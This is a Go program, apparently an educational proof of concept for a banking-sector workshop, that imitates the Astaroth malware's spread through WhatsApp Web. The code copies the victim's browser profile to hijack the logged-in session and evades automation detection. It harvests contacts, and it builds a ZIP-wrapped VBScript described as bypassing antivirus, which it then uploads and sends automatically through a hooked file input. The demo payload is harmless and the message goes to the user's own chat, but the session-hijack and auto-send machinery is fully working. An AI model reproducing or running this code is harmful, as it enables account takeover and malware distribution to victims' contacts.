package main

import (
	"archive/zip"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/launcher"
)

/*
WhatsApp Automation POC - Versão Educacional (Go) - FEBRABAN Demo
-----------------------------------------------------------------
Demonstra as capacidades wormable do Astaroth:
1. AUTO-DETECÇÃO do perfil do Chrome (Session Hijacking)
2. CÓPIA do perfil para pasta temporária (evita conflito de lock)
3. COLETA EM TEMPO REAL de contatos via Goroutines
4. POPUP VISUAL (Windows MessageBox) para impacto na plateia

RESTRIÇÕES DE SEGURANÇA:
- Sem C2 ou conexões externas.
- Sem propagação automática.
*/

const (
	WhatsAppURL = "https://web.whatsapp.com"
	TestMessage = "POC: Demonstração de automação em Go para aula de Cibersegurança."
)

// --- Windows API para MessageBox ---
var (
	user32         = syscall.NewLazyDLL("user32.dll")
	procMessageBox = user32.NewProc("MessageBoxW")
)

const (
	MB_OK              = 0x00000000
	MB_ICONWARNING     = 0x00000030
	MB_ICONINFORMATION = 0x00000040
	MB_TOPMOST         = 0x00040000
)

func messageBox(title, text string, flags uintptr) {
	titlePtr, _ := syscall.UTF16PtrFromString(title)
	textPtr, _ := syscall.UTF16PtrFromString(text)
	procMessageBox.Call(
		0,
		uintptr(unsafe.Pointer(textPtr)),
		uintptr(unsafe.Pointer(titlePtr)),
		flags,
	)
}

// --- Auto-detecção do Perfil do Chrome ---
func findChromeProfile() string {
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		return ""
	}

	candidates := []string{
		filepath.Join(localAppData, "Google", "Chrome", "User Data"),
		filepath.Join(localAppData, "Microsoft", "Edge", "User Data"),
		filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data"),
	}

	for _, path := range candidates {
		if info, err := os.Stat(path); err == nil && info.IsDir() {
			fmt.Printf("[+] Perfil encontrado: %s\n", path)
			return path
		}
	}
	return ""
}

// --- Cópia do Perfil (técnica usada pelo Astaroth real) ---
func copyProfile(srcDir string) (string, error) {
	tempDir, err := os.MkdirTemp("", "astaroth-poc-*")
	if err != nil {
		return "", fmt.Errorf("falha ao criar diretório temporário: %w", err)
	}

	fmt.Printf("[*] Copiando perfil para: %s\n", tempDir)

	essentialItems := []string{
		"Default",
		"Local State",
		"Profile 1",
	}

	for _, item := range essentialItems {
		src := filepath.Join(srcDir, item)
		dst := filepath.Join(tempDir, item)

		info, err := os.Stat(src)
		if err != nil {
			continue
		}

		if info.IsDir() {
			fmt.Printf("    [~] Copiando diretório: %s...\n", item)
			if err := copyDir(src, dst); err != nil {
				fmt.Printf("    [!] Aviso ao copiar %s: %v (continuando...)\n", item, err)
			}
		} else {
			if err := copyFile(src, dst); err != nil {
				fmt.Printf("    [!] Aviso ao copiar %s: %v\n", item, err)
			}
		}
	}

	fmt.Println("[+] Perfil copiado com sucesso!")
	return tempDir, nil
}

func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}

		relPath, _ := filepath.Rel(src, path)
		dstPath := filepath.Join(dst, relPath)

		if info.IsDir() {
			return os.MkdirAll(dstPath, 0755)
		}

		// Pula arquivos grandes (cache, logs) para velocidade
		if info.Size() > 50*1024*1024 {
			return nil
		}

		// Pula pastas de cache para velocidade
		if strings.Contains(relPath, "Cache") || strings.Contains(relPath, "Service Worker") ||
			strings.Contains(relPath, "Code Cache") || strings.Contains(relPath, "GPUCache") {
			return nil
		}

		return copyFile(path, dstPath)
	})
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return nil
	}
	defer in.Close()

	if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil {
		return err
	}

	out, err := os.Create(dst)
	if err != nil {
		return nil
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

// --- waitForWhatsApp: Aguarda o WhatsApp carregar com timeout e múltiplos seletores ---
// Seletores baseados no DOM REAL do WhatsApp Web (analisado em 2026-03-08)
func waitForWhatsApp(page *rod.Page) bool {
	fmt.Println("[*] Detectando estado do WhatsApp Web (timeout: 90s)...")

	// Tenta detectar qualquer um desses elementos por até 90s
	for i := 0; i < 30; i++ {
		time.Sleep(3 * time.Second)

		// Seletor 1: Chat list pelo aria-label (DOM REAL do WhatsApp)
		// <div aria-label="Chat list" role="grid" aria-rowcount="500">
		chatList, _ := page.Element("[aria-label='Chat list']")
		if chatList != nil {
			fmt.Println("[+] Chat list detectada (aria-label)! Sessão ativa!")
			return true
		}

		// Seletor 2: Grid com rowcount (lista virtualizada do WhatsApp)
		grid, _ := page.Element("div[role='grid'][aria-rowcount]")
		if grid != nil {
			fmt.Println("[+] Grid de conversas detectada! Sessão ativa!")
			return true
		}

		// Seletor 3: Rows de chat individuais
		rows, _ := page.Elements("div[role='row']")
		if len(rows) > 3 {
			fmt.Printf("[+] %d conversas detectadas! Sessão ativa!\n", len(rows))
			return true
		}

		// Seletor 4: Spans com title (nomes de contatos/grupos)
		contacts, _ := page.Elements("span[dir='auto'][title]")
		if len(contacts) > 3 {
			fmt.Printf("[+] %d contatos detectados! Sessão ativa!\n", len(contacts))
			return true
		}

		// Seletor 5: Fallbacks (data-testid, #pane-side)
		for _, sel := range []string{"[data-testid='chat-list']", "#pane-side"} {
			el, _ := page.Element(sel)
			if el != nil {
				fmt.Printf("[+] Elemento detectado (%s)! Sessão ativa!\n", sel)
				return true
			}
		}

		// Tenta clicar em botões "Usar aqui" / "Use here" / "Continuar"
		page.Eval(`
			document.querySelectorAll('div[role="button"], button').forEach(btn => {
				let text = btn.textContent.toLowerCase();
				if (text.includes('usar aqui') || text.includes('use here') || 
				    text.includes('continuar') || text.includes('continue') ||
				    text.includes('ok')) {
					btn.click();
				}
			});
		`)

		fmt.Printf("    [~] Aguardando... (%ds/%ds)\n", (i+1)*3, 90)
	}

	fmt.Println("[!] Timeout: WhatsApp não carregou completamente.")
	return false
}

func main() {
	fmt.Println("\033[36m") // Cyan/Azul para o SWaNk
	fmt.Println("  ___________      __          _______   __    ")
	fmt.Println(" /   _____/  \\    /  \\_____    \\      \\ |  | __")
	fmt.Println(" \\_____  \\\\   \\/\\/   /\\__  \\   /   |   \\|  |/ /")
	fmt.Println(" /        \\\\        /  / __ \\_/    |    \\    < ")
	fmt.Println("/_______  / \\__/\\  /  (____  /\\____|__  /__|_ \\")
	fmt.Println("        \\/       \\/        \\/         \\/     \\/")
	fmt.Println("\033[0m")
	fmt.Println("╔══════════════════════════════════════════════════╗")
	fmt.Println("║        SWaNk - criando pequenos monstros         ║")
	fmt.Println("║    FEBRABAN - Análise de Ameaças Cibernéticas    ║")
	fmt.Println("╚══════════════════════════════════════════════════╝")
	fmt.Println()

	// ETAPA 1: Auto-detecção e cópia do perfil
	fmt.Println("[1/4] Buscando perfil do navegador no sistema...")
	profilePath := findChromeProfile()

	l := launcher.New().
		Headless(false).
		Leakless(false).
		Set("disable-blink-features", "AutomationControlled")

	var tempProfileDir string

	if profilePath != "" {
		fmt.Println("[+] SESSION HIJACK: Copiando perfil para evitar conflito de lock...")
		var err error
		tempProfileDir, err = copyProfile(profilePath)
		if err != nil {
			fmt.Printf("[!] Erro ao copiar perfil: %v\n", err)
			fmt.Println("[!] Continuando sem sessão logada...")
		} else {
			l.UserDataDir(tempProfileDir)
			// Forçar uso do perfil Default (onde o WhatsApp fica logado)
			l.Set("profile-directory", "Default")
			fmt.Println("[+] Perfil clonado! O Chrome pode continuar aberto normalmente.")
		}
	} else {
		fmt.Println("[!] Nenhum perfil encontrado. Será necessário escanear o QR Code.")
	}

	// Cleanup do perfil temporário ao sair
	if tempProfileDir != "" {
		defer func() {
			fmt.Println("[*] Limpando perfil temporário...")
			os.RemoveAll(tempProfileDir)
		}()
	}

	url := l.MustLaunch()
	browser := rod.New().ControlURL(url).MustConnect()
	defer browser.MustClose()

	// ETAPA 2: Abrir WhatsApp Web
	fmt.Println("[2/4] Abrindo WhatsApp Web...")
	page := browser.MustPage(WhatsAppURL)

	if profilePath == "" {
		fmt.Println("[!] Escaneie o QR Code no navegador...")
	} else {
		fmt.Println("[*] Aguardando carregamento da sessão sequestrada...")
	}

	// Usa a função com timeout e múltiplos seletores
	if !waitForWhatsApp(page) {
		log.Println("[!] Não foi possível carregar o WhatsApp. Verifique o navegador.")
		fmt.Println("[*] Pressione ENTER para fechar...")
		var s string
		fmt.Scanln(&s)
		return
	}

	time.Sleep(3 * time.Second)

	// ETAPA 3: Coleta de contatos em tempo real
	fmt.Println("[3/4] Iniciando coleta de contatos em tempo real...")

	var mu sync.Mutex
	collectedContacts := []string{}

	// Coleta inicial
	initialElements, _ := page.Elements("span[title]")
	for _, el := range initialElements {
		name, err := el.Text()
		if err != nil || name == "" || len(name) <= 1 {
			continue
		}
		mu.Lock()
		collectedContacts = append(collectedContacts, name)
		mu.Unlock()
		if len(collectedContacts) >= 10 {
			break
		}
	}

	// NÃO mostra popup aqui — ele rouba o foco do Chrome e impede o ETAPA 4!
	// Os contatos serão exibidos no popup GRAND FINALE ao final.
	if len(collectedContacts) > 0 {
		fmt.Println("\n[!!] CONTATOS COLETADOS COM SUCESSO!")
		fmt.Println("[*] Contatos encontrados:")
		for i, name := range collectedContacts {
			fmt.Printf("    %d. %s\n", i+1, name)
		}
		fmt.Println("[*] (Popup será exibido após o envio da mensagem)")
	}

	// Goroutine de monitoramento contínuo
	go func() {
		seen := make(map[string]bool)
		mu.Lock()
		for _, n := range collectedContacts {
			seen[n] = true
		}
		mu.Unlock()

		for {
			time.Sleep(3 * time.Second)
			elements, err := page.Elements("span[title]")
			if err != nil {
				continue
			}
			for _, el := range elements {
				name, err := el.Text()
				if err != nil || name == "" || len(name) <= 1 {
					continue
				}
				if !seen[name] {
					seen[name] = true
					mu.Lock()
					collectedContacts = append(collectedContacts, name)
					total := len(collectedContacts)
					mu.Unlock()
					fmt.Printf("\a[REAL-TIME] Novo contato detectado: %s (Total: %d)\n", name, total)
				}
			}
		}
	}()

	// ETAPA 4: Grand Finale - Envio automático para o próprio chat
	fmt.Println("\n[4/4] GRAND FINALE: Enviando mensagem para o próprio chat...")
	fmt.Println("[*] Procurando chat 'Eu' na lista...")

	// Busca o chat "Eu" na lista de conversas
	var targetChat *rod.Element
	spans, _ := page.Elements("span[dir='auto'][title]")
	for _, span := range spans {
		title, _ := span.Attribute("title")
		if title != nil && *title == "Eu" {
			targetChat = span
			fmt.Println("[+] Chat 'Eu' encontrado! Clicando...")
			break
		}
	}

	if targetChat == nil {
		fmt.Println("[!] Chat 'Eu' não encontrado. Tentando pelo primeiro chat...")
		firstRow, err := page.Element("div[role='row']")
		if err != nil {
			log.Printf("[!] Nenhum chat encontrado: %v", err)
		} else {
			firstRow.MustClick()
		}
	} else {
		targetChat.MustClick()
	}

	time.Sleep(3 * time.Second)
	fmt.Println("[+] Chat aberto!")

	// Envia mensagem usando a API do go-rod (simula digitação humana)
	// O WhatsApp agora usa o Lexical Editor
	finalMsg := "That's all folks! Obrigado pela participação e presença nesse Workshop da FEBRABAN!"
	fmt.Println("[*] Encontrando caixa de mensagem (Lexical Editor)...")

	// Tenta múltiplas variações de seletor baseadas no HTML fornecido
	var chatBox *rod.Element
	selectors := []string{
		`div[contenteditable="true"][data-lexical-editor="true"]`,
		`div[contenteditable="true"][data-tab="10"]`,
		`div[contenteditable="true"][role="textbox"]`,
	}

	for _, sel := range selectors {
		elements, _ := page.Elements(sel)
		if len(elements) > 0 {
			// A última caixa na página costuma ser a de chat (a primeira é a de busca)
			chatBox = elements[len(elements)-1]
			break
		}
	}

	if chatBox != nil {
		fmt.Println("[*] Caixa de mensagem encontrada! Injetando texto via simulação de teclado...")
		chatBox.MustClick()
		time.Sleep(1 * time.Second)

		// Simula a digitação real (dispara todos os eventos do React/Lexical corretamente)
		chatBox.MustInput(finalMsg)
		time.Sleep(1 * time.Second)

		// Pressiona Enter para enviar a mensagem de texto
		chatBox.MustType(input.Enter)
		fmt.Println("[+] Mensagem de texto enviada!")

		time.Sleep(2 * time.Second)

		// ETAPA 4.1: Anexar arquivo do Desktop!
		fmt.Println("[*] Preparando envio de arquivo falso...")
		// Pegar o Desktop do usuário
		homeDir, _ := os.UserHomeDir()
		desktopDir := filepath.Join(homeDir, "Desktop")

		// Criar arquivo VBS real dentro de um ZIP para evadir AV
		vbsFileName := "EhVerdadeEsseBilete.vbs"
		zipFileName := "EhVerdadeEsseBilete.zip"
		fakePath := filepath.Join(desktopDir, zipFileName)

		// Cria o arquivo ZIP no Desktop
		zipFile, err := os.Create(fakePath)
		if err == nil {
			zipWriter := zip.NewWriter(zipFile)
			// Adiciona o VBS dentro do ZIP
			vbsWriter, _ := zipWriter.Create(vbsFileName)
			vbsContent := []byte("MsgBox \"That's all folks!\", vbInformation, \"SWaNk 2026\"\n")
			vbsWriter.Write(vbsContent)
			zipWriter.Close()
			zipFile.Close()
			fmt.Printf("[+] Criado arquivo ZIP contendo VBScript no Desktop: %s\n", fakePath)
		} else {
			fmt.Printf("[!] Erro ao criar ZIP: %v\n", err)
		}

		// Clica no botão de anexo baseado no DOM real fornecido
		attachBtn, err := page.Element(`button[aria-label="Attach"]`)
		if err != nil {
			attachBtn, _ = page.Element(`div[title="Attach"]`)
		}

		if attachBtn != nil {
			fmt.Println("[+] Botão de anexo encontrado! Clicando...")
			attachBtn.MustClick()
			time.Sleep(1 * time.Second)

			// 1. Hook JavaScript definitivo: Marcamos o input alvo que o WhatsApp tenta abrir!
			// Em vez de bloquear o CDP, injetamos um atributo customizado (data-bot-target="true")
			// no exato momento que o React tenta abrir a janela do Windows.
			fmt.Println("[*] Instalando Hook no Evento de Clique nativo...")
			page.Eval(`() => {
				const origClick = HTMLInputElement.prototype.click;
				HTMLInputElement.prototype.click = function() {
					if (this.type === 'file') {
						this.setAttribute('data-bot-target', 'true');
						// Evitar que o OS abra o File Chooser e trave o Chromium automation
						return;
					}
					origClick.apply(this, arguments);
				};
			}`)
			time.Sleep(500 * time.Millisecond)

			// 2. Clicamos no botão nativo "Documento" que surgiu no menu
			fmt.Println("[*] Simulando clique humano no ícone de Documentos...")
			page.Eval(`() => {
				let items = document.querySelectorAll('li, div[role="button"], span');
				for (let el of items) {
					let text = el.innerText ? el.innerText.trim().toLowerCase() : '';
					if (text === 'document' || text === 'documento') {
						let btn = el.closest('li') || el.closest('[role="button"]') || el;
						btn.click();
						return;
					}
				}
				// Fallback para seleção de documento
				let fallback = document.querySelector('[data-testid="attach-document"]');
				if (fallback) fallback.click();
			}`)
			time.Sleep(1 * time.Second)

			// 3. Magia: O WhatsApp tentou abrir a janela e nosso hook marcou o input certo.
			fmt.Println("[*] Buscando a armadilha do input Documento no DOM...")
			targetInput, err := page.Element(`input[data-bot-target="true"]`)
			if err == nil && targetInput != nil {
				targetInput.MustSetFiles(fakePath)
				fmt.Println("[+] Upload ZIP injetado com 100% de sucesso na interface do Documento!")
			} else {
				fmt.Println("[!] Aviso: O hook falhou em marcar o input. Entrando com injeção cega fallback...")
				inputs, _ := page.Elements(`input[type="file"][accept="*"]`)
				if len(inputs) > 0 {
					inputs[len(inputs)-1].MustSetFiles(fakePath)
				}
			}

			// 4. Limpeza nativa para estabilidade da sessão posterior
			page.Eval(`() => {
				delete HTMLInputElement.prototype.click;
			}`)

			time.Sleep(3 * time.Second)

			// Aguarda modal de preview e tenta clicar no botão de enviar
			fmt.Println("[*] Tela de preview carregada. Pressionando botão de envio...")

			// Tenta buscar o botão de enviar usando os seletores do DOM real fornecido
			// <div aria-label="Send" role="button"> ou <span data-icon="wds-ic-send-filled">
			var sendBtn *rod.Element

			// Tenta o div[aria-label="Send"] (mais confiável segundo o DOM fornecido)
			elements, _ := page.Elements(`div[aria-label="Send"][role="button"]`)
			if len(elements) > 0 {
				sendBtn = elements[0]
			} else {
				// Fallback para o ícone interno
				elements, _ = page.Elements(`span[data-icon="wds-ic-send-filled"]`)
				if len(elements) > 0 {
					sendBtn = elements[0]
				}
			}

			if sendBtn != nil {
				sendBtn.MustClick()
				fmt.Println("[+] Arquivo anexado e enviado com sucesso!")
				time.Sleep(2 * time.Second)
			} else {
				fmt.Println("[!] Não encontrou botão de enviar. Tentando Enter como fallback extremo...")
				page.Keyboard.MustType(input.Enter)
				time.Sleep(2 * time.Second)
			}

		} else {
			fmt.Println("[!] Botão de anexo (Attach) não encontrado no DOM.")
		}

	} else {
		log.Println("[!] Erro: Caixa de mensagem não encontrada no DOM.")
	}

	time.Sleep(2 * time.Second)

	fmt.Println("\n[!!] ==========================================")
	fmt.Println("[!!]  GRAND FINALE - DEMONSTRAÇÃO CONCLUÍDA")
	fmt.Println("[!!] ==========================================")

	mu.Lock()
	fmt.Printf("[*] Total de contatos extraídos: %d\n", len(collectedContacts))
	mu.Unlock()

	fmt.Println("[*] POC concluída. Pressione ENTER para fechar.")
	var inputStr string
	fmt.Scanln(&inputStr)
}
